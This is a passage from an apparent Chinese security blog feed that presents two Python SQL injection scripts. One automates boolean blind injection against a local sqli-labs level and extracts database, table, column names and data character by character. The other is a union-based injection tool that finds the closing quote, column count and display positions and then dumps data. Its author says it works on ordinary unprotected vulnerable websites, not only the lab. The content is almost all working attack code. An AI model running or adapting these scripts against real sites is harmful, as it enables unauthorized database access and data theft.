0</span><br><span class="line">                print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name)</span><br><span class="line">                break</span><br><span class="line">        if(i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_column = raw_input(&quot;请输入要查询的字段&quot;)</span><br><span class="line">    # # print zhiding_column</span><br><span class="line">    # columns_name = [&apos;id&apos;, &apos;email_id&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in columns_name:</span><br><span class="line">            print i, zhiding_column</span><br><span class="line">            if zhiding_column == i:</span><br><span class="line">                shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column)</span><br><span class="line">                print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name)</span><br><span class="line">                i = 0</span><br><span class="line">                break</span><br><span class="line">        if (i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>总的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line"></span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chahangshu(url,url1,url2,url3):</span><br><span class="line">    global jieduan</span><br><span class="line">    print url1,url2,url3</span><br><span class="line">    url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot;</span><br><span class="line">    print url</span><br><span class="line">    for i in range(0,29):</span><br><span class="line">        url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        jieguo = qingqiu(url_i1,url_i2)</span><br><span class="line">        if jieguo:</span><br><span class="line">            return i+1</span><br><span class="line"></span><br><span class="line">def chazifushu(url,url_chashuzi,hangshu):</span><br><span class="line">    global jieduan</span><br><span class="line">    url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi</span><br><span class="line">    list = []</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot;</span><br><span class="line">        for j in range(0,50):</span><br><span class="line">            url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1]</span><br><span class="line">            url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1]</span><br><span class="line">            jieguo = qingqiu(url3_1, url3_2)</span><br><span class="line">            if jieguo:</span><br><span class="line">                print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1)</span><br><span class="line">                list.append(j+1)</span><br><span class="line">                break</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    list = []</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        flag = &quot;&quot;</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1),</span><br><span class="line">                    flag+= chr(m+1)</span><br><span class="line">                    break</span><br><span class="line">                    print flag</span><br><span class="line"></span><br><span class="line">        list.append(flag)</span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema1 = &quot;select&quot;</span><br><span class="line">    url_schema2 = &quot;schema_name&quot;</span><br><span class="line">    url_schema3 = &quot;from information_schema.schemata&quot;</span><br><span class="line">    url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3</span><br><span class="line">    hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3)</span><br><span class="line">    print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_schema, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line"></span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line">    print listhang</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def chatable_name(url,schema_name):</span><br><span class="line">    url_table1 = &quot;select&quot;</span><br><span class="line">    url_table2 = &quot;table_name&quot;</span><br><span class="line">    url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name)</span><br><span class="line">    url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3</span><br><span class="line">    hangshu = chahangshu(url, url_table1, url_table2, url_table3)</span><br><span class="line">    print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_table, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_table, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def chacolumn_name(url,schema_name,table_name):</span><br><span class="line">    url_column1 = &quot;select&quot;</span><br><span class="line">    url_column2 = &quot;column_name&quot;</span><br><span class="line">    url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name)</span><br><span class="line">    url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3</span><br><span class="line">    # print url_column</span><br><span class="line">    hangshu = chahangshu(url, url_column1, url_column2, url_column3)</span><br><span class="line">    print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_column, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_column, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def cha_shuju(url, schema_name,table_name,column_name):</span><br><span class="line">    url_shuzhi1 = &quot;select&quot;</span><br><span class="line">    url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name)</span><br><span class="line">    url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name)</span><br><span class="line"></span><br><span class="line">    url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3</span><br><span class="line">    hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3)</span><br><span class="line">    print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_shuzhi, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line">    print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name)</span><br><span class="line">    zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;)</span><br><span class="line"></span><br><span class="line">    i =1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in schema_name:</span><br><span class="line">            print i,zhiding_schema</span><br><span class="line">            if zhiding_schema == i:</span><br><span class="line">                table_name = chatable_name(url, zhiding_schema)</span><br><span class="line">                print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name)</span><br><span class="line">                i =0</span><br><span class="line">                break</span><br><span class="line">        if(i ==1):</span><br><span class="line">            zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_table = raw_input(&quot;请输入要查询的表名&quot;)</span><br><span class="line">    # # print zhiding_table</span><br><span class="line">    # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in table_name:</span><br><span class="line">            print i, zhiding_table</span><br><span class="line">            if zhiding_table == i:</span><br><span class="line">                columns_name = chacolumn_name(url, zhiding_schema,zhiding_table)</span><br><span class="line">                i = 0</span><br><span class="line">                print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name)</span><br><span class="line">                break</span><br><span class="line">        if(i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_column = raw_input(&quot;请输入要查询的字段&quot;)</span><br><span class="line">    # # print zhiding_column</span><br><span class="line">    # columns_name = [&apos;id&apos;, &apos;email_id&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in columns_name:</span><br><span class="line">            print i, zhiding_column</span><br><span class="line">            if zhiding_column == i:</span><br><span class="line">                shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column)</span><br><span class="line">                print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name)</span><br><span class="line">                i = 0</span><br><span class="line">                break</span><br><span class="line">        if (i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用脚本去代替人工查询盲注&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python脚本之联合注入脚本</title>
    <link href="https://0xxk.github.io/2019/09/01/python%E8%84%9A%E6%9C%AC%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/"/>
    <id>https://0xxk.github.io/2019/09/01/python脚本之联合查询/</id>
    <published>2019-09-01T09:38:09.952Z</published>
    <updated>2019-09-07T16:10:30.293Z</updated>
    
    <content type="html"><![CDATA[<p>此脚本能实现最基础的联合查询注入。</p><a id="more"></a><p>此脚本不仅能在mysql-sqli1-5关中使用之外，还可以在一般的无WAF且有回显的漏洞网站中使用。可以自动判断截断符号，自动跑出所有的数据。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line"># 验证是否有注入</span><br><span class="line">def yanzhengceshi(url,html_text1):</span><br><span class="line">    global jieduan</span><br><span class="line">    zhushifu = [&apos;%23&apos;, &apos;--+&apos;]</span><br><span class="line">    for i in zhushifu:</span><br><span class="line">        xurl = url + i</span><br><span class="line">        print xurl</span><br><span class="line">        rurl_text = requests.get(xurl)</span><br><span class="line">        html_text3 = len(rurl_text.text)</span><br><span class="line">        print html_text3</span><br><span class="line">        rurl_base = base64.b64encode(rurl_text.text)</span><br><span class="line"></span><br><span class="line">        html_chaju = abs(html_text1 - html_text3)</span><br><span class="line">        if (html_chaju &lt; 8 ):</span><br><span class="line">            jieduan[1] = i</span><br><span class="line">            print xurl</span><br><span class="line">            return xurl</span><br><span class="line"></span><br><span class="line"># 找到报错点</span><br><span class="line">def ceshi():</span><br><span class="line">    global start_url, i, lists, jieduan</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    # 最初始的URL请求信息</span><br><span class="line">    start_url_text = requests.get(start_url)</span><br><span class="line"></span><br><span class="line">    print start_url</span><br><span class="line"></span><br><span class="line">    html_text1 = len(start_url_text.text)</span><br><span class="line">    print html_text1</span><br><span class="line"></span><br><span class="line">    start_url_base = base64.b64encode(start_url_text.text)</span><br><span class="line">    # 截断后的信息</span><br><span class="line">    url = start_url + i</span><br><span class="line"></span><br><span class="line">    url2 = url + &apos; and 1=2&apos;</span><br><span class="line">    print url</span><br><span class="line">    url_text = requests.get(url2)</span><br><span class="line">    print url2</span><br><span class="line">    html_text2 = len(url_text.text)</span><br><span class="line"></span><br><span class="line">    print html_text2</span><br><span class="line">    url_base = base64.b64encode(url_text.text)</span><br><span class="line"></span><br><span class="line">    jieguo = yanzhengceshi(url,html_text1)</span><br><span class="line"></span><br><span class="line">    html_chaju = abs(html_text1 - html_text2)</span><br><span class="line">    print html_chaju</span><br><span class="line">    if (html_chaju &gt; 15) and jieguo:</span><br><span class="line">        print jieguo</span><br><span class="line">        lists.append(jieguo)</span><br><span class="line">        print &quot;i==&#123;&#125;&quot;.format(i)</span><br><span class="line">        jieduan[0] = i</span><br><span class="line"></span><br><span class="line"># 拼接截断字符</span><br><span class="line">def testsql():</span><br><span class="line">    global start_url</span><br><span class="line">    global start_url, i, lists, jieduan</span><br><span class="line">    lists = []</span><br><span class="line">    jieduan = [&apos;&apos;, &apos;&apos;]</span><br><span class="line">    playload = [&quot;\&apos;&quot;, &quot;\&apos;)&quot;, &quot;\&quot;&quot;, &quot;\&quot;)&quot;, &quot;&quot;]</span><br><span class="line">    for i in playload:</span><br><span class="line">        ceshi()</span><br><span class="line">        print i</span><br><span class="line">    print lists</span><br><span class="line">    if lists:</span><br><span class="line">        print &quot;[!]存在注入，注入点为&#123;&#125;&quot;.format(lists[0])</span><br><span class="line">        return jieduan</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[!]不存在注入，程序退出&quot;</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"># 查询字段位数</span><br><span class="line">def chaziduanqingqiu(czdqq_url):</span><br><span class="line">    shuju = requests.get(czdqq_url)</span><br><span class="line">    html_text4 = len(shuju.text)</span><br><span class="line">    return html_text4</span><br><span class="line"></span><br><span class="line"># 拼接字段位数</span><br><span class="line">def chaziduan():</span><br><span class="line">    global start_url, jieduan</span><br><span class="line">    # print &quot;截断&#123;&#125;&quot;.format(jieduan[0])</span><br><span class="line">    chushi = &apos;&apos;</span><br><span class="line">    czd_url = start_url</span><br><span class="line">    ziduanshu = []</span><br><span class="line">    zhuruziduan = []</span><br><span class="line">    print &quot;截断[0]为&#123;&#125;&quot;.format(jieduan[0])</span><br><span class="line"></span><br><span class="line">    for i in range(1, 15):</span><br><span class="line">        czd_url = start_url + jieduan[0] + &apos; order by &apos; + str(i) + jieduan[1]</span><br><span class="line">        print czd_url</span><br><span class="line">        print i</span><br><span class="line">        shuzhi = chaziduanqingqiu(czd_url)</span><br><span class="line">        ziduanshu.append(shuzhi)</span><br><span class="line">        print ziduanshu</span><br><span class="line"></span><br><span class="line">    for i in range(len(ziduanshu) - 1):</span><br><span class="line">        if (abs(ziduanshu[i]-ziduanshu[i+1]) &gt; 5):</span><br><span class="line">            print &quot;[!]注入字段数为&#123;&#125;&quot;.format(i + 1)</span><br><span class="line">            zhuruziduan.append(i + 1)</span><br><span class="line"></span><br><span class="line">    print ziduanshu</span><br><span class="line">    return zhuruziduan</span><br><span class="line"></span><br><span class="line"># 查询显示位</span><br><span class="line">def chaxianshiweiqingqiu(strings, liebiao):</span><br><span class="line">    shuju = requests.get(url=strings)</span><br><span class="line">    xiabiao = []</span><br><span class="line">    print shuju.text</span><br><span class="line"></span><br><span class="line">    for i in range(len(liebiao)):</span><br><span class="line">        r = r&quot;[^&apos;]0xxk&#123;&#125;[^&apos;]&quot;.format(i)</span><br><span class="line">        print r</span><br><span class="line">        jieguo = re.search(r, shuju.text)</span><br><span class="line">        print jieguo</span><br><span class="line">        if jieguo:</span><br><span class="line">            print i</span><br><span class="line">            xiabiao.append(i)</span><br><span class="line">        print xiabiao</span><br><span class="line">    print &quot;---&quot;</span><br><span class="line">    return xiabiao</span><br><span class="line"></span><br><span class="line"># 拼接显示位</span><br><span class="line">def chaxianshiwei():</span><br><span class="line">    global start_url, ziduan, jieduan,xunhuanziduan</span><br><span class="line">    print &quot;[!]可注入的下标为:&quot;,</span><br><span class="line">    chushi_url = start_url</span><br><span class="line">    xianshiziduan = ziduan</span><br><span class="line">    xiabiao = []</span><br><span class="line"></span><br><span class="line">    for m in xianshiziduan:</span><br><span class="line">        liebiao = []</span><br><span class="line">        MC = &apos;&apos;</span><br><span class="line">        stringS = &apos;&apos;</span><br><span class="line">        strings = &apos;&apos;</span><br><span class="line">        for i in range(m):</span><br><span class="line">            MC = &apos;0xxk&apos; + str(i)</span><br><span class="line">            mingcheng = MC</span><br><span class="line">            liebiao.append(mingcheng)</span><br><span class="line">            stringS += &apos;\&apos;&apos; + mingcheng + &apos;\&apos;&apos;</span><br><span class="line">            strings = stringS</span><br><span class="line">            stringS += &apos;,&apos;</span><br><span class="line">        strings = start_url + jieduan[0] + &quot; and 1=2 union select &quot; + strings + jieduan[1]</span><br><span class="line">        print strings</span><br><span class="line">        print &apos;666&apos;</span><br><span class="line">        print liebiao</span><br><span 